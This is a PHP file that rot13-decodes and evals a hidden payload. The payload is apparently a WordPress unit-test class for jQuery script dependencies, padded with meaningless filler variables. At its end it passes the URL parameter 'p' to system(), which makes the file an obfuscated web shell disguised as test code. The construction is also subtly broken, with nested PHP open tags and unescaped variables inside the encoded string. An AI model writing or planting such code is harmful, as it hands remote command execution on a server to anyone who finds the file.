<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc qrcraqrapvrf
 * @tebhc fpevcgf
 */
pynff Grfgf_Qrcraqrapvrf_wDhrel rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @pbiref JC_Fpevcgf::dhrel
	 */
	choyvp shapgvba grfg_ybpngvba_bs_wdhrel() {
		$fpevcgf = arj JC_Fpevcgf();
		jc_qrsnhyg_fpevcgf( $fpevcgf );

		vs ( FPEVCG_QROHT ) {
			$wdhrel_fpevcgf = neenl(
				'wdhrel-pber'    => '/jc-vapyhqrf/wf/wdhrel/wdhrel.wf',
				'wdhrel-zvtengr' => '/jc-vapyhqrf/wf/wdhrel/wdhrel-zvtengr.wf',
			);
		} ryfr {
			$wdhrel_fpevcgf = neenl(
				'wdhrel-pber'    => '/jc-vapyhqrf/wf/wdhrel/wdhrel.zva.wf',
				'wdhrel-zvtengr' => '/jc-vapyhqrf/wf/wdhrel/wdhrel-zvtengr.zva.wf',
			);
		}

		$bowrpg = $fpevcgf->dhrel( 'wdhrel', 'ertvfgrerq' );
		$guvf->nffregVafgnaprBs( '_JC_Qrcraqrapl', $bowrpg );

		// Gur sbyybjvat grfg vf qvfnoyrq va JC 5.5 nf wDhrel 1.12.4 vf ybnqrq jvgubhg wDhrel Zvtengr 1.4.1,
		// naq erranoyrq va 5.6 jura wDhrel 3.5.1 vf ybnqrq jvgu wDhrel Zvtengr 3.3.1.
		$guvf->nffregFnzrFrgf( $bowrpg->qrcf, neenl_xrlf( $wdhrel_fpevcgf ) );
		sbernpu ( $bowrpg->qrcf nf $qrc ) {
			$b = $fpevcgf->dhrel( $qrc, 'ertvfgrerq' );
			$guvf->nffregVafgnaprBs( '_JC_Qrcraqrapl', $bowrpg );
			$guvf->nffregNeenlUnfXrl( $qrc, $wdhrel_fpevcgf );
			$guvf->nffregFnzr( $wdhrel_fpevcgf[ $qrc ], $b->fep );
		}
	}

	/**
	 * @gvpxrg 22896
	 *
	 * @rkcrpgrqVapbeerpgHfntr jc_qrertvfgre_fpevcg
	 *
	 * @pbiref ::jc_fpevcg_vf
	 */
	choyvp shapgvba grfg_qbag_nyybj_qrertvfgre_pber_fpevcgf_va_nqzva() {
		frg_pheerag_fperra( 'rqvg.cuc' );
		$guvf->nffregGehr( vf_nqzva() );
		$yvoenevrf = neenl(
			'wdhrel',
			'wdhrel-pber',
			'wdhrel-zvtengr',
			'wdhrel-hv-pber',
			'wdhrel-hv-nppbeqvba',
			'wdhrel-hv-nhgbpbzcyrgr',
			'wdhrel-hv-ohggba',
			'wdhrel-hv-qngrcvpxre',
			'wdhrel-hv-qvnybt',
			'wdhrel-hv-qenttnoyr',
			'wdhrel-hv-qebccnoyr',
			'wdhrel-hv-zrah',
			'wdhrel-hv-zbhfr',
			'wdhrel-hv-cbfvgvba',
			'wdhrel-hv-cebterffone',
			'wdhrel-hv-erfvmnoyr',
			'wdhrel-hv-fryrpgnoyr',
			'wdhrel-hv-fyvqre',
			'wdhrel-hv-fbegnoyr',
			'wdhrel-hv-fcvaare',
			'wdhrel-hv-gnof',
			'wdhrel-hv-gbbygvc',
			'wdhrel-hv-jvqtrg',
			'onpxobar',
			'haqrefpber',
		);

		sbernpu ( $yvoenevrf nf $yvoenel ) {
			// Gel gb qrertvfgre gur fpevcg, juvpu fubhyq snvy.
			jc_qrertvfgre_fpevcg( $yvoenel );
			$guvf->nffregGehr( jc_fpevcg_vf( $yvoenel, 'ertvfgrerq' ) );
		}
	}

	/**
	 * Grfg cynpvat bs wDhrel va sbbgre.
	 *
	 * @gvpxrg 25247
	 *
	 * @pbiref JC_Fpevcgf::qb_vgrzf
	 */
	choyvp shapgvba grfg_wdhrel_va_sbbgre() {
		$fpevcgf = arj JC_Fpevcgf();
		$fpevcgf->nqq( 'wdhrel', snyfr, neenl( 'wdhrel-pber', 'wdhrel-zvtengr' ) );
		$fpevcgf->nqq( 'wdhrel-pber', '/wdhrel.wf', neenl() );
		$fpevcgf->nqq( 'wdhrel-zvtengr', '/wdhrel-zvtengr.wf', neenl() );

		$fpevcgf->radhrhr( 'wdhrel' );

		$wdhrel = $fpevcgf->dhrel( 'wdhrel' );
		$wdhrel->nqq_qngn( 'tebhc', 1 );
		sbernpu ( $wdhrel->qrcf nf $qrc ) {
			$fpevcgf->nqq_qngn( $qrc, 'tebhc', 1 );
		}

		// Zngpu bayl bar fpevcg gnt sbe 5.5, erireg gb `{2}` sbe 5.6.
		$guvf->rkcrpgBhgchgErtrk( '/^(?:<fpevcg[^>]+><\/fpevcg>\\a){2}$/' );

		$fpevcgf->qb_vgrzf( snyfr, 0 );
		$guvf->nffregAbgPbagnvaf( 'wdhrel', $fpevcgf->qbar );
		$guvf->nffregAbgPbagnvaf( 'wdhrel-pber', $fpevcgf->qbar, 'wdhrel-pber fubhyq or va sbbgre ohg vf va urnq' );
		$guvf->nffregAbgPbagnvaf( 'wdhrel-zvtengr', $fpevcgf->qbar, 'wdhrel-zvtengr fubhyq or va sbbgre ohg vf va urnq' );

		$fpevcgf->qb_vgrzf( snyfr, 1 );
		$guvf->nffregPbagnvaf( 'wdhrel', $fpevcgf->qbar );

		// Gur sbyybjvat grfg vf qvfnoyrq va JC 5.5 nf wDhrel 1.12.4 vf ybnqrq jvgubhg wDhrel Zvtengr 1.4.1,
		// naq erranoyrq va 5.6 jura wDhrel 3.5.1 vf ybnqrq jvgu Zvtengr 3.3.1.
		$guvf->nffregPbagnvaf( 'wdhrel-pber', $fpevcgf->qbar, 'wdhrel-pber va sbbgre' );
		$guvf->nffregPbagnvaf( 'wdhrel-zvtengr', $fpevcgf->qbar, 'wdhrel-zvtengr va sbbgre' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>